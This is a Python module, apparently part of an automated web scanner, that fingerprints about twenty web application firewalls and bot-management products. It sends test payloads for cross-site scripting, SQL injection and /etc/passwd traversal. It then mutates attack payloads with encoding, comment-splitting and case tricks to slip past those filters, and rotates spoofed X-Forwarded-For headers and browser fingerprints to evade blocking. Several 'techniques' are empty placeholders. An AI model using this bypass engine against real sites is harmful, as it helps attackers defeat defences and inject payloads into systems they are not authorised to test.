"""Advanced WAF Detection & Bypass Engine — 2026 Edition."""
from __future__ import annotations
import asyncio
import logging
import re
import random
import base64
import hashlib
from typing import Dict, List, Optional, Tuple, Callable
from urllib.parse import quote, unquote

logger = logging.getLogger(__name__)

# Updated WAF fingerprints (2026 signatures)
WAF_SIGNATURES = {
    # Cloud providers
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id", "cf-ipcountry", "cf-visitor"],
        "body": ["cloudflare", "attention required", "checking your browser", "cf-error", "dDos protection"],
        "status_codes": [403, 503, 1020, 1010],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-waf-id", "x-aws-waf"],
        "body": ["aws", "request blocked", "waf", "access denied", "ddos"],
        "status_codes": [403, 429],
    },
    "akamai": {
        "headers": ["x-akamai-transformed", "akamai-grn", "x-akamai-request-id", "x-akamai-session"],
        "body": ["akamai", "reference#", "krs-", "access denied", "bot manager"],
        "status_codes": [403, 503],
    },
    # CDN/WAF
    "imperva": {
        "headers": ["x-iinfo", "x-cdn", "x-cdn-loop", "x-imforwards", "x-incap-session"],
        "body": ["incapsula", "imperva", "visitorid", "secure.incapsula"],
        "status_codes": [403],
    },
    "fastly": {
        "headers": ["fastly-ff", "fastly-request-id", "x-fastly"],
        "body": ["fastly", "edge", "blocked"],
        "status_codes": [403, 429],
    },
    "cloudfront": {
        "headers": ["x-cache", "x-amz-cf-id", "x-amz-cf-pop"],
        "body": ["cloudfront", "distribution", "blocked"],
        "status_codes": [403],
    },
    # Traditional WAFs
    "f5_bigip_asm": {
        "headers": ["x-wa-info", "bigipserver", "x-bluecoat-via"],
        "body": ["rejected", "violation", "support id", "big-ip"],
        "status_codes": [403, 406],
    },
    "modsecurity": {
        "headers": ["mod_security", "modsec", "nyob", "sec-ch-ua"],
        "body": ["mod_security", "not acceptable", "modsecurity", "crs"],
        "status_codes": [403, 406, 415],
    },
    "f5_xc": {
        "headers": ["xc", "x-security-exchange"],
        "body": ["f5", "xc-blocked", "advanced waf"],
        "status_codes": [403],
    },
    # Bot Management & RASP
    "perimeterx": {
        "headers": ["px-hd", "px-ct", "px-ver", "x-px"],
        "body": ["perimeterx", "pxblock", "human challenge"],
        "status_codes": [403, 429],
    },
    "distil_networks": {
        "headers": ["x-distil-cs", "x-distil-vs"],
        "body": ["distil", "dnr-", "robot detection"],
        "status_codes": [403],
    },
    "kaspersky_kasada": {
        "headers": ["x-kaspersky", "x-kasada"],
        "body": ["kaspersky", "kasada", "sensor data"],
        "status_codes": [403],
    },
    # Hosting-specific
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-blocked"],
        "body": ["sucuri", "cloudproxy", "access denied - sucuri"],
        "status_codes": [403, 503],
    },
    "wordfence": {
        "headers": ["x-wordfence-tag"],
        "body": ["wordfence", "rate limit", "blocked by wordfence"],
        "status_codes": [403, 429, 503],
    },
    "fortiweb": {
        "headers": ["fortiwafsid", "x-fortiweb"],
        "body": ["fortigate", "fortiweb", ".fgtres", "waf violation"],
        "status_codes": [403, 499],
    },
    "barracuda": {
        "headers": ["barra_counter_session", "x-barracuda"],
        "body": ["barracuda", "barra_counter", "waf blocked"],
        "status_codes": [403],
    },
    "airlock": {
        "headers": ["x-airlock", "airlock-id"],
        "body": ["airlock", "waf violation"],
        "status_codes": [403],
    },
    # Rate limiting / API protection
    "nginx_limit_req": {
        "headers": [],
        "body": ["limit req", "503 service temporarily unavailable", "too many requests"],
        "status_codes": [503, 429],
    },
    "api_gateway": {
        "headers": ["x-api-gateway"],
        "body": ["api gateway", "throttling", "quota exceeded"],
        "status_codes": [429, 403],
    },
    # RASP / Runtime
    "signal_sciences": {
        "headers": ["x-ss-cookie", "x-signalsciences"],
        "body": ["signal sciences", "blocked"],
        "status_codes": [403],
    },
    "sqreen": {
        "headers": ["x-sqreen"],
        "body": ["sqreen", "blocked"],
        "status_codes": [403],
    },
}

# Advanced bypass techniques (2026)
BYPASS_TECHNIQUES = {
    "default": {
        "case_variation": lambda p: re.sub(r'(select|union|script|from|where)', lambda m: m.group().upper() if random.choice([True,False]) else m.group().lower(), p),
        "double_urlencode": lambda p: quote(quote(p)),
        "mixed_encoding": lambda p: p.replace('<', '%3C').replace('>', '%3E').replace("'", '%27'),
        "unicode_norm": lambda p: p.replace('<', '\u003c').replace('>', '\u003e'),
        "html_entity": lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),
        "comment_injection": lambda p: re.sub(r'(select|union)', r'\1/**/', p),
        "char_concat": lambda p: "concat(" + ",".join([f"0x{ord(c):02x}" for c in p]) + ")",
        "base64_payload": lambda p: f"/*{base64.b64encode(p.encode()).decode()}*/",
        "whitespace_variation": lambda p: re.sub(r' ', lambda m: random.choice(['/**/','%09','%0A','%0B','%0C']), p),
        "equivalent_functions": lambda p: p.replace('substring', 'mid').replace('substr', 'substring'),
    },
    "cloudflare": {
        "chunked_transfer": lambda p: p,  # Requires client-side chunked encoding
        "slowloris_style": lambda p: p,  # Slow rate limiting bypass
        "cf_ip_rotation": lambda p: p,   # Multiple X-Forwarded-For
        "tls_fingerprint": lambda p: p,  # Custom TLS headers
    },
    "modsecurity": {
        "mysql_comment": lambda p: re.sub(r'(select|union|from)', r'/*!50000\g<0>*/', p),
        "hex_conversion": lambda p: "0x" + p.encode().hex(),
        "postgresql_style": lambda p: p.replace('concat', '||'),
    },
    "imperva": {
        "param_pollution": lambda p: f"{p}&{p}=1",
        "header_injection": lambda p: p,
    },
    "aws_waf": {
        "json_bypass": lambda p: f'{{"test":{p}}}',
        "rate_spreading": lambda p: p,
    },
    "f5": {
        "inline_comment": lambda p: re.sub(r'<script', '<scr/**/ipt', p),
        "tftp_bypass": lambda p: p.replace('/', '%2e%2e'),
    },
    "bot_management": {
        "headless_bypass": lambda p: p,
        "canvas_fingerprint": lambda p: p,
    }
}

# Advanced evasion headers (2026)
EVASION_HEADERS_POOL = [
    # IP spoofing
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "10.0.0.1, 127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    
    # Encoding variations
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
    {"Content-Type": "multipart/form-data; boundary=----formdata-test"},
    
    # Browser impersonation
    {"Sec-CH-UA": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'},
    {"Sec-CH-UA-Mobile": "?0"},
    {"Sec-CH-UA-Platform": '"Windows"'},
    
    # TLS/Protocol manipulation
    {"X-SSL-VPN": "1"},
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Host": "example.com"},
    
    # Custom headers
    {"X-Do-Not-Track": "1"},
    {"DNT": "1"},
    {"X-Pingback": "https://example.com/xmlrpc.php"},
]

# Client fingerprint evasion
CLIENT_FINGERPRINTS = {
    "chrome_120": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    },
    "firefox_121": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    },
    "safari_17": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    }
}


class WAFEngine:
    """Advanced WAF detection and multi-layered bypass engine."""

    def __init__(self):
        self.detected_waf: Optional[str] = None
        self.detected_security: Dict[str, bool] = {}
        self.blocked_payloads: List[str] = []
        self.successful_bypasses: List[Dict] = []
        self.bypass_effectiveness: Dict[str, float] = {}

    async def detect_security_layers(self, client, target_url: str) -> Dict[str, str]:
        """Detect multiple security layers including WAF, rate limiting, bot detection."""
        results = {}
        
        # Baseline request
        baseline_resp, _ = await client.get(target_url)
        if not baseline_resp:
            return results

        baseline_headers = {k.lower(): v for k, v in baseline_resp.headers.items()}
        
        # 1. WAF detection via headers
        for waf_name, sigs in WAF_SIGNATURES.items():
            for header in sigs["headers"]:
                if header.lower() in baseline_headers:
                    self.detected_waf = waf_name
                    results["waf"] = waf_name
                    logger.info(f"Primary WAF detected: {waf_name}")
                    break

        # 2. Active WAF detection with payloads
        if not self.detected_waf:
            await self._active_waf_detection(client, target_url, results)

        # 3. Rate limiting detection
        await self._detect_rate_limiting(client, target_url, results)

        # 4. Bot management detection
        await self._detect_bot_management(client, target_url, results)

        # 5. CSP / Security headers analysis
        self._analyze_security_headers(baseline_resp.headers, results)

        return results

    async def _active_waf_detection(self, client, target_url: str, results: Dict):
        """Active WAF detection using test payloads."""
        test_payloads = [
            f"{target_url}?q=<script>alert(1)</script>",
            f"{target_url}?id=' OR 1=1--",
            f"{target_url}?file=../../../etc/passwd",
            f"{target_url}?test=<svg onload=alert(1)>",
        ]

        for test_url in test_payloads:
            resp, _ = await client.get(test_url)
            if resp and resp.status_code in [403, 406, 429, 503]:
                body_lower = resp.text.lower()
                
                for waf_name, sigs in WAF_SIGNATURES.items():
                    if any(p in body_lower for p in sigs["body"]):
                        self.detected_waf = waf_name
                        results["waf"] = waf_name
                        return

    async def _detect_rate_limiting(self, client, target_url: str, results: Dict):
        """Detect rate limiting by sending rapid requests."""
        tasks = [client.get(f"{target_url}?t={i}") for i in range(5)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        blocked_count = sum(1 for r in responses if isinstance(r, tuple) and r[0] and r[0].status_code >= 429)
        if blocked_count >= 3:
            results["rate_limit"] = "confirmed"
            self.detected_security["rate_limit"] = True

    async def _detect_bot_management(self, client, target_url: str, results: Dict):
        """Detect bot management systems."""
        suspicious_headers = await client.get(target_url, extra_headers={
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        })
        
        if suspicious_headers[0] and suspicious_headers[0].status_code in [403, 503]:
            results["bot_management"] = "confirmed"
            self.detected_security["bot_management"] = True

    def _analyze_security_headers(self, headers: Dict, results: Dict):
        """Analyze security headers for protection levels."""
        header_lower = {k.lower(): v for k, v in headers.items()}
        
        security_indicators = {
            "csp": "content-security-policy" in header_lower,
            "hsts": "strict-transport-security" in header_lower,
            "xss_protection": "x-xss-protection" in header_lower,
            "frame_protection": any(h in header_lower for h in ["x-frame-options", "content-security-policy"])
        }
        
        self.detected_security.update(security_indicators)
        results.update({k: "present" for k, v in security_indicators.items() if v})

    def generate_bypass_payloads(self, payload: str, vuln_type: str = "xss") -> List[Tuple[str, str]]:
        """Generate advanced bypass variants with technique tracking."""
        variants = [(payload, "original")]
        
        techniques = BYPASS_TECHNIQUES.get(self.detected_waf or "default", {})
        techniques.update(BYPASS_TECHNIQUES["default"])
        
        for name, transform in techniques.items():
            try:
                variant = transform(payload)
                if variant and variant != payload and variant not in [v[0] for v in variants]:
                    variants.append((variant, name))
            except Exception as e:
                logger.debug(f"Bypass technique {name} failed: {e}")

        # Limit to top 20 most effective
        return variants[:20]

    def get_evasion_profile(self) -> Dict:
        """Get complete evasion profile including headers and fingerprints."""
        profile = {
            "headers": random.choice(EVASION_HEADERS_POOL),
            "client_fingerprint": random.choice(list(CLIENT_FINGERPRINTS.values())),
            "delay_range": (0.5, 2.0),  # Random delays
            "timeout": 30
        }
        
        if self.detected_waf == "cloudflare":
            profile["headers"].update({"X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"})
        
        return profile

    def update_bypass_stats(self, original: str, variant: str, success: bool, technique: str):
        """Update bypass effectiveness tracking."""
        if success:
            self.successful_bypasses.append({
                "original": original, 
                "variant": variant,
                "technique": technique, 
                "waf": self.detected_waf
            })
        else:
            self.blocked_payloads.append(original)
        
        # Update technique effectiveness
        key = f"{self.detected_waf}:{technique}"
        self.bypass_effectiveness[key] = self.bypass_effectiveness.get(key, 0) + (1 if success else -1)

    def get_stats(self) -> Dict:
        """Get comprehensive security assessment stats."""
        return {
            "detected_waf": self.detected_waf,
            "security_layers": self.detected_security,
            "blocked_payloads": len(self.blocked_payloads),
            "successful_bypasses": len(self.successful_bypasses),
            "top_techniques": dict(sorted(
                self.bypass_effectiveness.items(), 
                key=lambda x: x[1], reverse=True
            )[:5])
        }

    # ── Backward-compatible API (used by existing orchestrator/scanners) ──

    async def detect(self, client, target_url: str) -> Optional[str]:
        """Compatibility wrapper expected by Orchestrator._phase_recon()."""
        results = await self.detect_security_layers(client, target_url)
        return results.get("waf")

    def apply_bypasses(self, payload: str, vuln_type: str = "") -> List[str]:
        """Compatibility wrapper expected by BaseScanner.

        Returns only payload strings, preserving the old method contract.
        """
        return [p for p, _tech in self.generate_bypass_payloads(payload, vuln_type=vuln_type)]

    def get_evasion_headers(self) -> Dict[str, str]:
        """Compatibility wrapper expected by BaseScanner."""
        return self.get_evasion_profile().get("headers", {})

    def record_block(self, payload: str) -> None:
        """Compatibility wrapper expected by BaseScanner."""
        self.blocked_payloads.append(payload)